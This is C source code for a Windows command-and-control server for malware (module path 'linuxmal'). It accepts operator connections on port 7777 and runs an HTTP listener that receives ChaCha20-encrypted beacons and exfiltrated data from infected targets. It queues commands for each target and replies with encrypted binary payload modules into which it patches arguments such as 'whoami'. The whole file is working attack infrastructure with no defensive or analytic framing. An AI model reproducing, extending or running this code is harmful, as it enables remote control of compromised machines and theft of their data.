#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>

#define CONTROL_PORT 7777
#define HTTP_PORT 80
#define BUFFER_SIZE 4096
#define MAX_CLIENTS 100
#define MAX_MSG_LEN 256
#define MAX_ID_LEN 64

#pragma comment(lib, "ws2_32.lib")  // Link with Winsock library

// External function provided
extern void* chacha20_Full(void* message, void* buffer, uint64_t length);

typedef struct {
    SOCKET socket;
    struct sockaddr_in address;
    int is_authority;
    char target_id[50];
} client_t;

// --- Message Node ---
typedef struct MsgNode {
    char message[MAX_MSG_LEN];
    struct MsgNode* next;
} MsgNode;

// --- Queue per Target ---
typedef struct Queue {
    char targetId[MAX_ID_LEN];
    MsgNode* head;
    MsgNode* tail;
    struct Queue* next;
} Queue;



// Global variables
CRITICAL_SECTION clients_cs;
CRITICAL_SECTION messages_cs;
client_t *clients[MAX_CLIENTS];
int http_listener_active = 0;
SOCKET http_socket = INVALID_SOCKET;

// Head of all queues
Queue* queueList = NULL;

void *memmem(const void *haystack, size_t haystacklen,
                      const void *needle, size_t needlelen) {
    if (needlelen == 0 || haystacklen < needlelen) {
        return NULL;
    }

    const unsigned char *h = haystack;
    const unsigned char *n = needle;

    for (size_t i = 0; i <= haystacklen - needlelen; i++) {
        if (h[i] == n[0] && memcmp(h + i, n, needlelen) == 0) {
            return (void *)(h + i);
        }
    }
    return NULL;
}

char *bytes_to_hex(const unsigned char *buf, size_t len) {
    // 2 hex chars per byte + 1 for null terminator
    char *hexstr = malloc(len * 2 + 1);
    if (!hexstr) return NULL;

    for (size_t i = 0; i < len; i++) {
        sprintf(hexstr + i * 2, "%02x", buf[i]);
    }

    hexstr[len * 2] = '\0'; // null terminate
    return hexstr;
}

// --- Find or Create Queue for targetId ---
Queue* getQueue(const char* targetId) {
    Queue* q = queueList;
    while (q) {
        if (strcmp(q->targetId, targetId) == 0) {
            return q;
        }
        q = q->next;
    }

    // Create new queue
    Queue* newQ = (Queue*)malloc(sizeof(Queue));
    strcpy(newQ->targetId, targetId);
    newQ->head = newQ->tail = NULL;
    newQ->next = queueList;
    queueList = newQ;

    printf("[Server] Created new queue for target %s\n", targetId);
    return newQ;
}

// --- Enqueue message ---
void enqueue(const char* targetId, const char* msg) {
    Queue* q = getQueue(targetId);
    MsgNode* node = (MsgNode*)malloc(sizeof(MsgNode));
    strcpy(node->message, msg);
    node->next = NULL;

    if (!q->tail) {
        q->head = q->tail = node;
    } else {
        q->tail->next = node;
        q->tail = node;
    }
    printf("[Server] Stored message for %s: %s\n", targetId, msg);
}

// --- Dequeue message ---
char* dequeue(const char* targetId) {
    Queue* q = getQueue(targetId);
    if (!q->head) {
        return NULL; // No messages
    }
    MsgNode* node = q->head;
    q->head = q->head->next;
    if (!q->head) {
        q->tail = NULL;
    }
    char* msg = strdup(node->message);
    free(node);
    return msg;
}


unsigned char *load_module(char *module, int *size){

    // strip newline
    size_t len = strlen(module);
    if (len > 0 && module[len - 1] == '\n') {
        module[len - 1] = '\0';
    }

    // find first space
    char *space = strchr(module, ' ');
    char *moduleName, *argumentStr;
    if (space) {
        *space = '\0'; // terminate module name
        moduleName = module;          // module = first token
        argumentStr = space + 1;     // args = rest of string
    } else {
        moduleName = module;          // only module, no args
        argumentStr = "whoami";
    }
    
    // Load a binary file (e.g., "data.bin")
    char path[100];
    snprintf(path, sizeof(path), "D:/linuxmal/modules/bin/%s.bin", moduleName);
    FILE* file = fopen(path, "rb");
    if (!file) {
        printf("[-] Failed to open %s",path);
        return NULL; 
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);

    unsigned char* file_buffer = malloc(file_size);
    if (!file_buffer) {
        perror("[-] Memory allocation failed");
        fclose(file);
        return NULL;
    }

    fread(file_buffer, 1, file_size, file);
    fclose(file);

    //replece with arguments
    char *pos = memmem(file_buffer, file_size, "0xFFFFFFFF", strlen("0xFFFFFFFF")); //strstr(file_buffer, "0xFFFFFFFF");
    if (pos) {
        memcpy(pos, argumentStr, strlen(argumentStr) + 1);  // overwrite in place
    }

    // Encrypt the file content
    unsigned char* encrypted_data = chacha20_Full(file_buffer,file_buffer,file_size);

    // Create buffer with "NZNZ" + encrypted content
    unsigned char* full_payload = malloc(8 + file_size);
    memcpy(full_payload, "NSLM55IM", 8);
    memcpy(full_payload + 8, encrypted_data, file_size);

    // Send everything in one send() call
    *size =  8 + file_size;

    printf("[+] Sent signature and encrypted binary (%ld bytes).\n", file_size);
    free(file_buffer);
    //free(full_payload);

    return full_payload;
} 


void broadcast_to_clients(const char *message, SOCKET exclude_socket) {
    EnterCriticalSection(&clients_cs);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i] && clients[i]->socket != exclude_socket) {
            send(clients[i]->socket, message, (int)strlen(message), 0);
        }
    }
    
    LeaveCriticalSection(&clients_cs);
}


void add_client(SOCKET socket, struct sockaddr_in address) {
    EnterCriticalSection(&clients_cs);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (!clients[i]) {
            clients[i] = (client_t*)malloc(sizeof(client_t));
            clients[i]->socket = socket;
            clients[i]->address = address;
            clients[i]->is_authority = 0;
            memset(clients[i]->target_id, 0, sizeof(clients[i]->target_id));
            
            LeaveCriticalSection(&clients_cs);
            return;
        }
    }
    
    LeaveCriticalSection(&clients_cs);
}

void remove_client(SOCKET socket) {
    EnterCriticalSection(&clients_cs);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i] && clients[i]->socket == socket) {
            free(clients[i]);
            clients[i] = NULL;
            break;
        }
    }
    
    LeaveCriticalSection(&clients_cs);
}

int start_http_listener() {
    if (http_listener_active) {
        return 0; // Already running
    }
    
    http_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (http_socket == INVALID_SOCKET) {
        printf("HTTP socket creation failed: %d\n", WSAGetLastError());
        return -1;
    }
    
    int opt = 1;
    if (setsockopt(http_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) == SOCKET_ERROR) {
        printf("HTTP setsockopt failed: %d\n", WSAGetLastError());
        closesocket(http_socket);
        return -1;
    }
    
    struct sockaddr_in http_addr;
    http_addr.sin_family = AF_INET;
    http_addr.sin_addr.s_addr = INADDR_ANY;
    http_addr.sin_port = htons(HTTP_PORT);
    
    if (bind(http_socket, (struct sockaddr *)&http_addr, sizeof(http_addr)) == SOCKET_ERROR) {
        printf("HTTP bind failed: %d\n", WSAGetLastError());
        closesocket(http_socket);
        return -1;
    }
    
    if (listen(http_socket, 10) == SOCKET_ERROR) {
        printf("HTTP listen failed: %d\n", WSAGetLastError());
        closesocket(http_socket);
        return -1;
    }
    
    http_listener_active = 1;
    printf("HTTP listener started on port %d\n", HTTP_PORT);
    return 0;
}

void stop_http_listener() {
    if (http_listener_active) {
        closesocket(http_socket);
        http_listener_active = 0;
        printf("HTTP listener stopped\n");
    }
}

DWORD WINAPI handle_http_connections(LPVOID arg) {
    while (http_listener_active) {
        struct sockaddr_in client_addr;
        int client_len = sizeof(client_addr);
        
        SOCKET client_socket = accept(http_socket, (struct sockaddr *)&client_addr, &client_len);
        if (client_socket == INVALID_SOCKET) {
            if (http_listener_active) {
                printf("HTTP accept failed: %d\n", WSAGetLastError());
            }
            continue;
        }
        
        char buffer[BUFFER_SIZE];
        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        uint64_t bytes_receivedU64 = bytes_received;
        
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            printf("Received HTTP request:\n%s\n", buffer);
            unsigned char* decrypted = chacha20_Full(buffer, buffer, bytes_receivedU64);
            printf("Received Decrypted HTTP request:\n%s\n", decrypted);

            if (strncmp((char*)decrypted, "GET", 3) != 0) {
                continue;
            }

            if (strncmp((char*)decrypted, "GET /data=", 10) == 0) {
                snprintf(buffer, sizeof(buffer), "DATA:%s\0", &buffer[10]);
            }
            printf("Size - %d\n",bytes_receivedU64);
            printf("out:\n%s\n", buffer);
            
            char* reply;
            if (strncmp((char*)decrypted, "GET /becon=ALIVE:", 17) == 0) {
                char *hex = bytes_to_hex(&decrypted[17], 8);
                printf("TRAGET %s CONECTED\n", hex);
                memset(buffer, 0, sizeof(buffer));
                snprintf(buffer, sizeof(buffer), "TARGET:%s\0", hex);
                free(hex);
                reply = dequeue(buffer+7);
                printf("%s",reply);
            }

            // Broadcast to all control clients
            char broadcast_msg[BUFFER_SIZE + 100];
            snprintf(broadcast_msg, sizeof(broadcast_msg),"%s\n",buffer);
            
            broadcast_to_clients(broadcast_msg, INVALID_SOCKET);

            
            
            char *response;
            int response_size;

            if(reply){
                response = load_module(reply,&response_size);
                if(!response){
                    // Send basic HTTP response
                    response = "Request received by server";
                    response_size = (int)strlen(response);
                }
            }else{
                // Send basic HTTP response
                response = "Request received by server";;
                response_size = (int)strlen(response);
            }
            
            
            send(client_socket, response, response_size, 0);
        }
        
        closesocket(client_socket);
    }
    
    return 0;
}

DWORD WINAPI handle_client(LPVOID arg) {
    SOCKET client_socket = *(SOCKET*)arg;
    free(arg);
    
    char buffer[BUFFER_SIZE];
    int bytes_received;
    
    while ((bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';
        
        // Check if this is an authority client command
        if (strncmp(buffer, "AUTH:", 5) == 0) {
            char *command = buffer + 5;
            
            EnterCriticalSection(&clients_cs);
            for (int i = 0; i < MAX_CLIENTS; i++) {
                if (clients[i] && clients[i]->socket == client_socket) {
                    clients[i]->is_authority = 1;
                    break;
                }
            }
            LeaveCriticalSection(&clients_cs);
            
            if (strncmp(command, "START_HTTP", 10) == 0) {
                if (start_http_listener() == 0) {
                    send(client_socket, "HTTP listener started\n", 22, 0);
                    
                    // Start HTTP listener thread
                    HANDLE http_thread = CreateThread(NULL, 0, handle_http_connections, NULL, 0, NULL);
                    if (http_thread) CloseHandle(http_thread);
                } else {
                    send(client_socket, "Failed to start HTTP listener\n", 30, 0);
                }
            } else if (strncmp(command, "STOP_HTTP", 9) == 0) {
                stop_http_listener();
                send(client_socket, "HTTP listener stopped\n", 22, 0);
            }
        }
        // Check if this is a target registration
        else if (strncmp(buffer, "TARGET:", 7) == 0) {
            char* id = strtok(buffer + 7, ":");
            char* msg = strtok(NULL, "");
            if (!id || !msg) {
                printf("[Server] Invalid message format.\n");
                continue;
            }

            enqueue(id, msg);
            
            send(client_socket, "command enqueued wait for response\n", 35, 0);
        }
        else {

            // Regular message, broadcast to all clients
            char broadcast_msg[BUFFER_SIZE + 50];
            snprintf(broadcast_msg, sizeof(broadcast_msg), "CLIENT_%llu: %s", (unsigned long long)client_socket, buffer);
            broadcast_to_clients(broadcast_msg, client_socket);
        }
    }
    
    remove_client(client_socket);
    closesocket(client_socket);
    return 0;
}

int main() {
    WSADATA wsaData;
    SOCKET server_socket;
    struct sockaddr_in server_addr;
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }
    
    // Initialize critical sections
    InitializeCriticalSection(&clients_cs);
    InitializeCriticalSection(&messages_cs);
    
    // Initialize clients array
    for (int i = 0; i < MAX_CLIENTS; i++) {
        clients[i] = NULL;
    }
    
    // Create server socket
    server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_socket == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    
    // Set socket options
    int opt = 1;
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) == SOCKET_ERROR) {
        printf("Setsockopt failed: %d\n", WSAGetLastError());
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }
    
    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(CONTROL_PORT);
    
    // Bind socket
    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Bind failed: %d\n", WSAGetLastError());
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }
    
    // Listen for connections
    if (listen(server_socket, 10) == SOCKET_ERROR) {
        printf("Listen failed: %d\n", WSAGetLastError());
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }
    
    printf("Server running on port %d\n", CONTROL_PORT);
    
    // Main server loop
    while (1) {
        struct sockaddr_in client_addr;
        int client_len = sizeof(client_addr);
        
        SOCKET client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_len);
        if (client_socket == INVALID_SOCKET) {
            printf("Accept failed: %d\n", WSAGetLastError());
            continue;
        }
        
        printf("New client connected: %s:%d\n", 
               inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
        
        add_client(client_socket, client_addr);
        
        // Create thread for client
        SOCKET *client_sock_ptr = (SOCKET*)malloc(sizeof(SOCKET));
        *client_sock_ptr = client_socket;
        
        HANDLE thread_handle = CreateThread(NULL, 0, handle_client, client_sock_ptr, 0, NULL);
        if (thread_handle == NULL) {
            printf("Thread creation failed: %d\n", GetLastError());
            closesocket(client_socket);
            free(client_sock_ptr);
        } else {
            CloseHandle(thread_handle);
        }
    }
    
    closesocket(server_socket);
    WSACleanup();
    DeleteCriticalSection(&clients_cs);
    DeleteCriticalSection(&messages_cs);
    return 0;
}



// unsigned char* decrypted = chacha20_Full(buffer, buffer, 17);
//             if (strncmp((char*)decrypted, "GET /becon=ALIVE:", 17) == 0) {
//                 char broadcast_msg[15]; // +1 for null terminator if treating as string
//                 memcpy(broadcast_msg, &decrypted[11], 14);
//                 broadcast_msg[14] = '\0'; // null-terminate
//                 broadcast_to_clients(broadcast_msg, client_socket);

//             }